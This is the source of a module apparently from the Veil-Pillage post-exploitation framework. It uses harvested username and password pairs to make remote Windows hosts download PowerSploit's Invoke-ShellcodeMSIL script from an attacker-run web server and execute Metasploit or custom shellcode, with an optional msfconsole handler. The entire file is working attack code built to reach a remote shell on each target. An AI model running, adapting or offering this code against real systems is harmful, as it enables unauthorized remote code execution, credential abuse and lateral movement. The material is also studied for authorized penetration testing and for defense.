"""

Execute PowerSploit's CodeExecution/Invoke-ShellcodeMSIL.ps1 module on our host.

We do this by throwing up a temporary web server, hosting the script and using
invoking the downloader launcher on the host.

All cred to the PowerSploit guys !
    https://github.com/mattifestation/PowerSploit/


Module built by @harmj0y

"""

import time, sys, os

import settings
from lib import messages
from lib import delivery_methods
from lib import helpers

# Veil-Evasion import for shellcode generation
from modules.common import shellcode

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Invoke-ShellcodeMSIL"
        self.description = ("Execute PowerSploit's Invoke-ShellcodeMSIL module on a host. "
                            "This will invoke a variety of shellcode payloads on the host.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # any relevant text to echo to the output file
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                 "use_ssl"           :   ["false", "use https for hosting"],
                                 "lhost"             :   ["", "lhost for hosting"],
                                 "spawn_handler"     :   ["false", "spawn a meterpreter handler"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        spawnHandler = self.required_options["spawn_handler"][0]
        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]

        # nab up some shellcode from Veil-Evasion
        # users can set custom shellcode there
        sc = shellcode.Shellcode()

        # set the payload to use, if specified
        if self.args.msfpayload:
            sc.SetPayload([self.args.msfpayload, self.args.msfoptions])

        # set custom shellcode if specified
        elif self.args.custshell:
            sc.setCustomShellcode(self.args.custshell)

        # generate our shellcode and get it into the correct format
        sc_raw = sc.generate()
        sc_transformed = ",0".join(sc_raw.split("\\"))[1:]

        # re-print the title and module name after shellcode generation (Veil-Evasion trashes this)
        messages.title()
        sys.stdout.write(" [*] Executing module: " + helpers.color(self.name) + "...")

        # if we're using Veil-Evasion's generated handler script, try to spawn it
        if spawnHandler.lower() == "true":
            # turn our shellcode object into a handler script
            handlerPath = helpers.shellcodeToHandler(sc)
            # make sure a handler was returned
            if handlerPath != "":
                # command to spawn a new tab
                cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
                # invoke msfconsole with the handler script in a new tab
                os.system(cmd)
                raw_input("\n\n [>] Press enter when handler is ready: ")

        # path to the PowerSploit Invoke-ShellcodeMSIL.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/PowerSploit/Invoke-ShellcodeMSIL.ps1"
       
        # command to invoke the appropriate shellcode in the script
        scriptArguments = "Invoke-ShellcodeMSIL -Shellcode @(%s)" %(sc_transformed)
        
        # trigger the powershell download on all targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, triggerMethod, ssl=use_ssl)

        for target in self.targets:
            self.output += "[*] Powersploit:Invoke-ShellcodeMSIL triggered using creds '"+username+":"+password+"' on "+target+" using "+triggerMethod+"\n"

            # build our cleanup file -> kill all powershell processes
            killCMD = "taskkill /f /im powershell.exe"
            self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCMD+"|"+triggerMethod+"\n"

